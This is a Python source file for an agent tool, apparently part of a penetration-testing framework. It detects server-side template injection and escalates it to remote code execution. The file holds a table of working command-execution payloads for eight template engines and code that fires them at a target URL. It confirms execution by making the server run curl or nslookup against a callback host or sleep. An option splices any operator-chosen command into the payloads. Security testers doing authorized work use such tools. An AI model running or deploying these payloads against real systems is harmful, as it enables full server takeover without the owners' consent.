"""ssti_rce — fingerprint the template engine and escalate SSTI to real RCE.

A math-reflection probe (``{{7*7}}`` -> ``49``) only proves *injection*; it does
not prove code execution, and the payload that runs a command is engine-specific.
This tool closes that gap end to end:

1. **Fingerprint** the engine by injecting a multi-delimiter polyglot with a
   unique product and a couple of disambiguators (Jinja ``{{7*'7'}}`` -> string
   repeat vs Twig -> ``49``), narrowing to the real engine — Jinja2, Twig,
   Freemarker, Velocity, Smarty, Mako, ERB, Handlebars.
2. **Escalate** to RCE with the canonical per-engine gadget that runs an OS
   command (e.g. Jinja ``cycler.__init__.__globals__.os.popen``, Freemarker
   ``Execute``, ERB backticks).
3. **Confirm** out-of-band only: a blind ``sleep`` time-delay oracle (default,
   zero infra) and/or an OAST callback — never a destructive command.

Set ``command`` to also get the gadget weaponized for *your* command; delivering
that is the operator's call. Only test authorized targets.
"""

from __future__ import annotations

import asyncio
import json
import time
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from agents import RunContextWrapper, function_tool

from strix.tools.http_replay.tools import _replay_impl
from strix.tools.oast.client import get_domain as _oast_get_domain
from strix.tools.oast.client import poll as _oast_poll


_SLEEP_SECONDS = 8
_DELAY_THRESHOLD_MS = 6000

# Unique factors so the product can't collide with page content.
_MATH_A = 1234
_MATH_B = 1237
_PRODUCT = str(_MATH_A * _MATH_B)  # 1526458

# Which engines can render each delimiter's math (narrowing set).
_DELIMITERS: tuple[tuple[str, str, tuple[str, ...]], ...] = (
    ("{{%s}}", "double_brace", ("jinja2", "twig", "handlebars")),
    ("${%s}", "dollar_brace", ("freemarker", "mako")),
    ("<%%= %s %%>", "erb_tag", ("erb",)),
    ("{%s}", "single_brace", ("smarty",)),
)

# Engine -> ordered RCE gadget templates; ``{CMD}`` is the shell command slot.
_RCE: dict[str, tuple[str, ...]] = {
    "jinja2": (
        "{{cycler.__init__.__globals__.os.popen('{CMD}').read()}}",
        "{{lipsum.__globals__.os.popen('{CMD}').read()}}",
        "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('{CMD}').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('{CMD}').read()}}",
    ),
    "twig": (
        "{{['{CMD}']|map('system')|join(',')}}",
        "{{['{CMD}']|filter('system')}}",
        "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('{CMD}')}}",
    ),
    "freemarker": ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("{CMD}")}',),
    "velocity": (
        "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))"
        "#set($ex=$rt.getRuntime().exec('{CMD}'))$ex.waitFor()",
    ),
    "smarty": (
        "{system('{CMD}')}",
        "{php}system('{CMD}');{/php}",
        "{Smarty_Internal_Runtime_TplFunction::system('{CMD}')}",
    ),
    "mako": (
        "${self.module.cache.util.os.system('{CMD}')}",
        "<%import os%>${os.system('{CMD}')}",
    ),
    "erb": (
        "<%= `{CMD}` %>",
        "<%= system('{CMD}') %>",
        "<%= IO.popen('{CMD}').read %>",
    ),
    "handlebars": (
        '{{#with "s" as |string|}}{{#with split as |conslist|}}'
        '{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}'
        "{{#with string.split as |codelist|}}{{this.pop}}"
        "{{this.push \"return require('child_process').exec('{CMD}');\"}}{{this.pop}}"
        "{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}"
        "{{/each}}{{/with}}{{/with}}{{/with}}",
    ),
}

_ALL_ENGINES: tuple[str, ...] = tuple(_RCE.keys())


def _fill(template: str, cmd: str) -> str:
    # Command goes into a single-quoted / backtick shell context; neutralise quotes.
    safe = cmd.replace("\\", "\\\\").replace("'", "'\\''")
    return template.replace("{CMD}", safe)


def rce_payloads(engine: str, cmd: str) -> list[str]:
    """Return the ordered RCE gadgets for ``engine`` with ``cmd`` spliced in."""
    return [_fill(t, cmd) for t in _RCE.get(engine, ())]


# --------------------------------------------------------------------------- #
# Fingerprinting                                                              #
# --------------------------------------------------------------------------- #


def _probe_string(math: str) -> str:
    return "".join(fmt % math for fmt, _, _ in _DELIMITERS)


def candidates_from_body(body: str) -> list[str]:
    """Which engines are plausible given a rendered probe response body."""
    hits: list[str] = []
    if _PRODUCT in body:
        for _, _, engines in _DELIMITERS:
            hits.extend(engines)
    # velocity/mako share ${} — add velocity when the dollar delimiter rendered.
    if _PRODUCT in body:
        hits.append("velocity")
    # De-dupe, keep order.
    seen: set[str] = set()
    out: list[str] = []
    for e in hits:
        if e not in seen:
            seen.add(e)
            out.append(e)
    return out


def disambiguate(body_mult: str) -> str | None:
    """Jinja renders ``{{7*'7'}}`` as string-repeat; Twig renders it numeric."""
    # caller sends {{7*'7'}} with 7 replaced by _MATH_A digits-safe marker below
    repeat = "zz" * 7
    if repeat in body_mult:
        return "jinja2"
    return None


# --------------------------------------------------------------------------- #
# Delivery + confirmation                                                     #
# --------------------------------------------------------------------------- #


def _place(
    url: str,
    param: str,
    where: str,
    value: str,
    headers: dict[str, str] | None,
    body: str | None,
) -> tuple[str, dict[str, str], str | None]:
    hdrs = dict(headers or {})
    if where == "body":
        if body and "{PAYLOAD}" in body:
            return url, hdrs, body.replace("{PAYLOAD}", value)
        # form-encode the single param into the body
        return url, hdrs, urlencode({param: value})
    # query
    parsed = urlparse(url)
    query = parse_qs(parsed.query, keep_blank_values=True)
    query[param] = [value]
    flat = urlencode({k: v[-1] for k, v in query.items()})
    return urlunparse(parsed._replace(query=flat)), hdrs, body


def _deliver(
    url: str,
    param: str,
    where: str,
    value: str,
    method: str,
    headers: dict[str, str] | None,
    body: str | None,
    timeout: int,
) -> dict[str, Any]:
    u, h, b = _place(url, param, where, value, headers, body)
    return _replay_impl(method, u, h, b, timeout + _SLEEP_SECONDS + 5, allow_redirects=False)


def _delayed(baseline_ms: float, payload_ms: float) -> bool:
    return payload_ms - baseline_ms >= _DELAY_THRESHOLD_MS


def _confirm_engine(
    engine: str,
    url: str,
    param: str,
    where: str,
    method: str,
    headers: dict[str, str] | None,
    body: str | None,
    oast_domain: str | None,
    timeout: int,
) -> dict[str, Any]:
    result: dict[str, Any] = {"engine": engine, "confirmed": False, "oracle": None}

    # 1) OAST oracle.
    if oast_domain:
        oast_cmd = f"curl -s http://{oast_domain}/ || nslookup {oast_domain}"
        for payload in rce_payloads(engine, oast_cmd):
            _deliver(url, param, where, payload, method, headers, body, timeout)
        time.sleep(3)
        poll = _oast_poll()
        if poll.get("got_callback"):
            result.update(confirmed=True, oracle="oast", oast=poll.get("interactions"))
            return result

    # 2) Blind time-delay oracle.
    baseline = _deliver(url, param, where, "strix-baseline", method, headers, body, timeout)
    base_ms = baseline.get("elapsed_ms") or 0
    for payload in rce_payloads(engine, f"sleep {_SLEEP_SECONDS}"):
        hit = _deliver(url, param, where, payload, method, headers, body, timeout)
        hit_ms = hit.get("elapsed_ms") or 0
        if baseline.get("success") and hit.get("success") and _delayed(base_ms, hit_ms):
            result.update(
                confirmed=True,
                oracle="time-delay",
                payload=payload,
                baseline_ms=base_ms,
                payload_ms=hit_ms,
            )
            return result
    result["baseline_ms"] = base_ms
    return result


def _fingerprint(
    url: str,
    param: str,
    where: str,
    method: str,
    headers: dict[str, str] | None,
    body: str | None,
    timeout: int,
) -> tuple[str | None, list[str]]:
    probe = _deliver(
        url, param, where, _probe_string(f"{_MATH_A}*{_MATH_B}"), method, headers, body, timeout
    )
    cands = candidates_from_body(probe.get("body", "")) if probe.get("success") else []
    engine = None
    if "jinja2" in cands or "twig" in cands:
        mult = _deliver(url, param, where, "{{7*'zz'}}", method, headers, body, timeout)
        engine = disambiguate(mult.get("body", "")) if mult.get("success") else None
    return engine, cands


def _ssti_impl(
    url: str,
    param: str,
    where: str,
    command: str | None,
    engines: list[str] | None,
    method: str,
    headers: dict[str, str] | None,
    body: str | None,
    oast_domain: str,
    timeout: int,
) -> dict[str, Any]:
    if not url or not url.strip():
        return {"success": False, "error": "url cannot be empty"}
    if not param or not param.strip():
        return {"success": False, "error": "param cannot be empty"}

    engine, cands = _fingerprint(url, param, where, method, headers, body, timeout)
    targets = engines or ([engine] if engine else None) or cands or list(_ALL_ENGINES)

    oast = oast_domain.strip() or None
    if oast_domain == "auto":
        got = _oast_get_domain()
        oast = got.get("domain") if got.get("success") else None

    findings: list[dict[str, Any]] = []
    for eng in targets:
        conf = _confirm_engine(eng, url, param, where, method, headers, body, oast, timeout)
        if command:
            conf["weaponized_payload"] = rce_payloads(eng, command)
        findings.append(conf)

    confirmed = [f for f in findings if f["confirmed"]]
    return {
        "success": True,
        "url": url,
        "engine": engine,
        "candidates": cands,
        "engines_tested": targets,
        "oast_domain": oast,
        "vulnerable": bool(confirmed),
        "confirmed_engines": [f["engine"] for f in confirmed],
        "findings": findings,
    }


@function_tool(timeout=900, strict_mode=False)
async def ssti_rce(
    ctx: RunContextWrapper,
    url: str,
    param: str,
    where: str = "query",
    command: str | None = None,
    engines: list[str] | None = None,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    body: str | None = None,
    oast_domain: str = "auto",
    timeout: int = 15,
) -> str:
    """Fingerprint the template engine and escalate SSTI to confirmed RCE.

    Confirmation uses safe out-of-band oracles only: a blind ``sleep`` time-delay
    (default) and an OAST callback when available — no target mutation. Set
    ``command`` to also get the gadget weaponized for *your* command; delivering
    it is your call. Only test authorized targets.

    Returns JSON with ``vulnerable``, ``engine``, ``confirmed_engines`` and
    per-engine ``oracle`` / ``payload`` / ``weaponized_payload`` /
    ``baseline_ms`` / ``payload_ms``.

    Args:
        url: Target URL whose ``param`` reflects into a template.
        param: Parameter name carrying the payload.
        where: Injection point — ``query`` (default) or ``body``.
        command: OS command to weaponize a gadget for (confirmation never uses it).
        engines: Restrict to these engines; default auto-fingerprint then candidates.
        method: HTTP method (default GET).
        headers: Extra request headers (e.g. auth).
        body: Raw body; use ``{PAYLOAD}`` as a placeholder for body injection.
        oast_domain: ``auto`` (default) to mint one, a host to reuse, or ``""`` for time-delay only.
        timeout: Base per-request timeout in seconds (default 15).
    """
    del ctx
    return json.dumps(
        await asyncio.to_thread(
            _ssti_impl,
            url,
            param,
            where,
            command,
            engines,
            method,
            headers,
            body,
            oast_domain,
            timeout,
        ),
        ensure_ascii=False,
        default=str,
    )
